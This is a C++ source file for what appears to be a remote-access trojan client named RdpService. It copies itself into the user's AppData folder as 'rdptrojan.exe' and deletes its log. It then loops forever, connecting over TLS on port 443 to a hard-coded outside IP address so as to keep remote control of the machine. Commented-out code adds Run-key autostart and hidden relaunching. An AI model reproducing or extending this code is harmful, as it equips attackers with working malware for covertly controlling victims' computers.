// RdpService.cpp : Defines the entry point for the application.
//
#include "RdpService.h"
#include "base.h"

//const char* address_table[] = {"192.168.16.104", "206.189.227.213", "intelstar.rdp.com"}; 
const char* address_table[] = { "206.189.227.213" };
//const char* address_table[] = { "192.168.6.130" };
#define ADDRESS_TABEL_SIZE sizeof(address_table)/sizeof(address_table[0])
#define SERVER_PORT		"443"

// double execution checking server thread module
static DWORD WINAPI double_check_thread(LPVOID lpParam)
{
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	u_short server_port = SELF_LIVE_SEVR_PORT;
	// if self server port is not given as parameter
	// create local server to detect duplicated execution
	SOCKET server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (server_sock != INVALID_SOCKET) {
		struct sockaddr_in singleton_addr;
		singleton_addr.sin_family = AF_INET;
		singleton_addr.sin_port = htons(server_port);
		singleton_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
		// try to bind to the local server to detect duplicated execution
		if (bind(server_sock, (struct sockaddr *) &singleton_addr, sizeof(singleton_addr)) != SOCKET_ERROR) {
			if (listen(server_sock, SOMAXCONN) != SOCKET_ERROR) {
				char recvbuf[BUFFER_SIZE];
				int recvbuflen = BUFFER_SIZE;
				while (true) {
					SOCKET client_sock = accept(server_sock, NULL, NULL);
					if (client_sock != INVALID_SOCKET) {
						int rd = recv(client_sock, recvbuf, recvbuflen, 0);
						if (rd > 0) {
							std::string reply = "HTTP/1.1 200 Connection Established\r\nConnection: Close\r\n\r\n";
							send(client_sock, reply.data(), reply.size(), 0);
						}
						SAFE_SOCKET_CLOSE(client_sock);
					}
					else break;
				}
			}
		}
		SAFE_SOCKET_CLOSE(server_sock);
	}
	NOTIFY_MESSAGE("Doubled execution is not allowed");
	exit(0);
	return 0;
}

// start endless loop for service connection
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
	// load WSA socket library
	WSADATA wsaData = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// create double-execution and keepalive checking server thread
	CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)double_check_thread, NULL, 0, NULL));
	// remove log
	remove("rdpservice.log");
	// get local pathname
	TCHAR systemPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, systemPath))) {
		lstrcatW(systemPath, TEXT("\\AppData\\Local\\rdptrojan.exe")); // targeted over win7
		/*
		// self-register for auto-run
		HKEY hkey = NULL;
		if (RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey) == ERROR_SUCCESS) {
			RegSetValueEx(hkey, PROCESS_NAME, 0, REG_SZ, (BYTE *)systemPath, (lstrlen(systemPath) + 1) * sizeof(wchar_t));
			RegCloseKey(hkey);
		}*/
		// get current working path
		TCHAR modulePath[MAX_PATH];
		GetModuleFileName(NULL, modulePath, MAX_PATH);
		// Copy Myself if I'm not at the position
		if (lstrcmp(modulePath, systemPath) != 0) {
			CopyFile(modulePath, systemPath, FALSE);
			/*
			// create process with copied and remove myself
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			CreateProcess(NULL, systemPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess); */
		}
		//else {
			//  start endless loop to keep connection and the browser's control
			int index = 0;
			while (1) {
				try {
					NOTIFY_MESSAGE("Connecting to " + std::string(address_table[index]));
					boost::asio::io_service io_service;
					boost::asio::ip::tcp::resolver resolver(io_service);
					boost::asio::ip::tcp::resolver::query query(address_table[index], SERVER_PORT);	// connect server:443 port
					boost::asio::ip::tcp::resolver::iterator iterator = resolver.resolve(query);
					boost::asio::ssl::context ctx(boost::asio::ssl::context::tlsv12);
					ServiceClient sc(io_service, ctx, iterator);
					io_service.run();
				}
				catch (std::exception& e) {
					NOTIFY_MESSAGE("Exception: " + std::string(e.what()));
				}
				index = (index == ADDRESS_TABEL_SIZE - 1) ? 0 : index + 1;
				Sleep(1000);	// wait for 1s before next connection
			}
		//}		
	}
	WSACleanup();
    return 0;
}
